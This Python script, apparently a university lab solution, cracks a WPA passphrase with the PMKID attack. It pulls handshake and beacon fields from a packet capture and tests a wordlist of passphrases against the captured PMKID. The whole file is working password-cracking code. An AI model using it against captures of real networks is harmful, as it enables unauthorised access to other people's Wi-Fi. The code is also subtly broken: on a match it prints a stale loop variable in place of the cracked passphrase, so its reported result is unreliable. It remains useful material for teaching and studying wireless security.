#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Obtention de la PMKID et des paramètres pour la dérivation de la PMK

Crack de la Passphrase utilisant l'attaque PMKID
"""

__author__ = "Delphine Scherler et Wenes Limem"
__copyright__ = "Copyright 2022, HEIG-VD"


from scapy.all import *
from binascii import a2b_hex, b2a_hex
# from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

from scapy.layers.dot11 import Dot11Beacon, Dot11


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("PMKID_handshake.pcap")
# Récupération d'une trame d'authentification
auth_frame = wpa[434]
# Récupération d'un beacon frame
beacon_frame = wpa[463]
# Première trame du 4-way handshake
key_1 = wpa[465]
# Deuxième trame du 4-way handshake
key_2 = wpa[467]
# Récupération de la pmkid dans la 1ère trame du 4-way handshake
pmkid = key_1.load[-16:].hex()
# Récupération du nonce de l'Authenticator
anonce = key_1.load[13:45].hex()
# Récupération du nonce du Supplicant
snonce = raw(key_2)[-108:-76].hex()
stats = beacon_frame[Dot11Beacon].network_stats()
# Récupération de l'adresse MAC de l'AP
ap_mac = beacon_frame[Dot11].addr2.replace(':', '')
# Récupération du SSID
ssid = stats.get("ssid")
# Récupération de l'adresse MAC du client
cli_mac = auth_frame[Dot11].addr2.replace(':', '')

# Lecture du fichier avec les passphrases
correct_passph = "Not found"
f = open('passphrase_file', 'r')
passPhrases = f.readlines()

# stripping passphrases from \n character
cnt = 0
for passPhrase in passPhrases:
    passPhrases[cnt] = passPhrase.rstrip()
    cnt += 1

# Important parameters for key derivation - most of them can be obtained from the pcap file

A = "Pairwise key expansion"  # this string is used in the pseudo-random function
APmac = a2b_hex(ap_mac)
Clientmac = a2b_hex(cli_mac)
# Authenticator and Supplicant Nonces
ANonce = a2b_hex(anonce)
SNonce = a2b_hex(snonce)
B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)
data = a2b_hex(
    "0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")

print("\n\nValues used to derivate keys")
print("============================")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("CLient Mac: ", b2a_hex(Clientmac), "\n")
print("AP Nonce: ", b2a_hex(ANonce), "\n")
print("Client Nonce: ", b2a_hex(SNonce), "\n")
# Constant pmk name
pmk_name = str.encode("PMK Name")
ssid = str.encode(ssid)

# Checking with each passphrase read from the dictionary
for passph in passPhrases:
    passph = str.encode(passph)
    # calculate pmk
    pmk = pbkdf2(hashlib.sha1, passph, ssid, 4096, 32)
    # expand pmk to obtain PTK
    ptk = customPRF512(pmk, str.encode(A), B)
    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16], data, hashlib.sha1)
    # calculate pmkid
    pmkid_found = hmac.new(pmk, pmk_name + APmac + Clientmac, hashlib.sha1)
    # checking pmkid
    if pmkid_found.hexdigest()[:-8] == pmkid:
        print("\nResults of the key expansion")
        print("=============================")
        print("Passphrase: ", passPhrase, "\n")
        print("PMK:\t\t", pmk.hex(), "\n")
        print("PMKID:\t\t", pmkid_found.hexdigest()[:-8],"\n")
        print("PTK:\t\t", ptk.hex(), "\n")
        print("KCK:\t\t", ptk[0:16].hex(), "\n")
        print("KEK:\t\t", ptk[16:32].hex(), "\n")
        print("TK:\t\t", ptk[32:48].hex(), "\n")
        print("MICK:\t\t", ptk[48:64].hex(), "\n")
        print("MIC:\t\t", mic.hexdigest(), "\n")
        break
